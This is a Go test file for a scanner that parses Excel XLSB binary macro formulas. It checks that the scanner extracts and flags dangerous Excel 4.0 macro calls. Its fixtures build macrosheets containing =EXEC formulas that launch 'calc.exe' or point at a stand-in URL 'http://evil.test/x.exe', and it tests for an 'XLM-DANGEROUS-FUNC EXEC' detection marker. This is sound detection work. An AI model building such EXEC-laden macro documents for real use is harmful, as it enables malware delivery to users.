package extract

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"strings"
	"testing"
	"time"
)

// --- varint ---

func TestReadVarint(t *testing.T) {
	cases := []struct {
		in   []byte
		want int
		n    int
	}{
		{[]byte{0x00}, 0, 1},
		{[]byte{0x7f}, 127, 1},
		{[]byte{0x80, 0x01}, 128, 2},
		{[]byte{0xff, 0x7f}, 16383, 2},
		{[]byte{0x80, 0x80, 0x01}, 16384, 3},
		{[]byte{}, 0, 0},                       // truncated
		{[]byte{0x80}, 0, 0},                   // continuation but truncated
		{[]byte{0x80, 0x80, 0x80, 0x80}, 0, 0}, // 4 bytes, still continuing → malformed
	}
	for _, c := range cases {
		v, n := readVarint(c.in)
		if v != c.want || n != c.n {
			t.Errorf("readVarint(%v) = (%d,%d), want (%d,%d)", c.in, v, n, c.want, c.n)
		}
	}
}

// --- BIFF12 ptg parser ---

// strPtg builds a BIFF12 ptgStr token: 0x17 + uint16 charcount + UTF-16LE.
func strPtg(s string) []byte {
	out := []byte{ptgStr}
	out = binary.LittleEndian.AppendUint16(out, uint16(len([]rune(s))))
	for _, r := range s {
		out = binary.LittleEndian.AppendUint16(out, uint16(r))
	}
	return out
}

func TestParseBIFF12Formula_StringUTF16(t *testing.T) {
	got := parseBIFF12Formula(strPtg("http://evil.test"))
	if got != "http://evil.test" {
		t.Fatalf("got %q", got)
	}
}

func TestParseBIFF12Formula_Concat(t *testing.T) {
	// "ab" & "cd" → ptgStr ab, ptgStr cd, ptgConcat
	rgce := append(strPtg("ab"), strPtg("cd")...)
	rgce = append(rgce, ptgConcat)
	if got := parseBIFF12Formula(rgce); got != "abcd" {
		t.Fatalf("got %q", got)
	}
}

func TestParseBIFF12Formula_ExecFuncVar(t *testing.T) {
	// =EXEC("calc.exe") : ptgStr arg, then ptgFuncVar argc=1 funcid=110(EXEC)
	rgce := strPtg("calc.exe")
	rgce = append(rgce, ptgFuncVar, 1)
	rgce = binary.LittleEndian.AppendUint16(rgce, 110)
	got := parseBIFF12Formula(rgce)
	if !strings.Contains(got, "=EXEC(calc.exe)") {
		t.Fatalf("got %q", got)
	}
}

func TestParseBIFF12Formula_FailOpenTruncated(t *testing.T) {
	// charcount says 5 but no bytes follow → fold-what-we-have, no panic.
	rgce := []byte{ptgStr, 0x05, 0x00}
	if got := parseBIFF12Formula(rgce); got != "" {
		t.Fatalf("got %q", got)
	}
}

// --- record extraction ---

// fmlaNumRecord builds a FMLA_NUM payload: col4 style4 value8 flags2 sz4 rgce.
func fmlaNumRecord(rgce []byte) []byte {
	var p []byte
	p = binary.LittleEndian.AppendUint32(p, 0) // col
	p = binary.LittleEndian.AppendUint32(p, 0) // style
	p = append(p, make([]byte, 8)...)          // value (double)
	p = binary.LittleEndian.AppendUint16(p, 0) // flags
	p = binary.LittleEndian.AppendUint32(p, uint32(len(rgce)))
	p = append(p, rgce...)
	return p
}

func TestBIFF12FormulaRgce(t *testing.T) {
	rgce := strPtg("payload")
	p := fmlaNumRecord(rgce)
	got := biff12FormulaRgce(p)
	if !bytes.Equal(got, rgce) {
		t.Fatalf("got %v want %v", got, rgce)
	}
}

func TestBIFF12FormulaRgce_TooShort(t *testing.T) {
	if got := biff12FormulaRgce(make([]byte, 14)); got != nil {
		t.Fatalf("payload < 15 bytes must return nil, got %v", got)
	}
}

func TestBIFF12FormulaRgce_AmbiguousRejected(t *testing.T) {
	// Construct a payload where two value-field widths both satisfy
	// off+4+sz == len(p), so the extractor cannot disambiguate → must return nil.
	// valWidth=1: off=11, need sz @ p[11..15], rgceStart=15, sz must = len-15.
	// valWidth=2: off=12, need sz @ p[12..16], rgceStart=16, sz must = len-16.
	// Pick len=24. width1 sz=9 @off11; width2 sz=8 @off12. Overlapping windows;
	// craft bytes so both i32 reads equal their required value simultaneously is
	// hard, so instead: zero-fill and rely on sz=0 matching only one width.
	// Simpler deterministic ambiguity: all-zero payload. sz reads 0 at every off;
	// off+4+0 == len(p) holds only when off+4 == len(p). For len=16: off=12
	// (width2) gives 16; off=11(width1) gives 15≠16; off=14(width4) gives 18≠16;
	// off=18(width8) skipped. → exactly ONE match, NOT ambiguous. Use len that
	// two widths hit: off+4==len for width a, and a different width b with sz!=0.
	// Build explicitly: len=18 → width4 off=14, off+4=18, sz=0 ✓ (rgce empty).
	//                          width1 off=11, sz @11 must=18-15=3 to also match.
	p := make([]byte, 18)
	// width4 self-consistent with sz=0 (zeros at p[14:18]).
	// Make width1 ALSO self-consistent: sz @ p[11:15] = 3.
	p[11] = 3
	if got := biff12FormulaRgce(p); got != nil {
		t.Fatalf("ambiguous record must return nil, got %v", got)
	}
}

// --- end-to-end through a zip ---

// putVarint appends a value as a pyxlsb2 varint.
func putVarint(b []byte, v int) []byte {
	for {
		c := byte(v & 0x7f)
		v >>= 7
		if v != 0 {
			b = append(b, c|0x80)
		} else {
			b = append(b, c)
			return b
		}
	}
}

func biff12Record(id int, payload []byte) []byte {
	var b []byte
	b = putVarint(b, id)
	b = putVarint(b, len(payload))
	return append(b, payload...)
}

// buildXLSB makes a minimal OOXML zip with one .bin part at the given path
// holding a single FMLA_NUM record whose formula folds to wantFold.
func buildXLSB(t *testing.T, partPath, formula string) []byte {
	t.Helper()
	// =EXEC("formula") ptg stream.
	rgce := strPtg(formula)
	rgce = append(rgce, ptgFuncVar, 1)
	rgce = binary.LittleEndian.AppendUint16(rgce, 110) // EXEC
	rec := biff12Record(biff12FmlaNum, fmlaNumRecord(rgce))

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, err := zw.Create(partPath)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write(rec); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func foldStreams(t *testing.T, data []byte) [][]byte {
	t.Helper()
	zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatal(err)
	}
	var out [][]byte
	fromXLSBXLMFold(zr, &out, time.Time{})
	return out
}

func TestXLSBFold_Macrosheet(t *testing.T) {
	data := buildXLSB(t, "xl/macrosheets/sheet1.bin", "http://evil.test/x.exe")
	out := foldStreams(t, data)

	var sawFold, sawDanger bool
	for _, s := range out {
		if strings.Contains(string(s), "http://evil.test/x.exe") {
			sawFold = true
		}
		if string(s) == "XLM-DANGEROUS-FUNC EXEC" {
			sawDanger = true
		}
	}
	if !sawFold {
		t.Errorf("folded formula string not emitted; streams=%q", out)
	}
	if !sawDanger {
		t.Errorf("XLM-DANGEROUS-FUNC EXEC marker not emitted; streams=%q", out)
	}
}

func TestXLSBFold_WorksheetFPGated(t *testing.T) {
	// Same record content but in xl/worksheets/ — must NOT be folded (only
	// xl/macrosheets/ is a macro carrier).
	data := buildXLSB(t, "xl/worksheets/sheet1.bin", "http://evil.test/x.exe")
	out := foldStreams(t, data)
	if len(out) != 0 {
		t.Fatalf("worksheet .bin must not fold; got %q", out)
	}
}
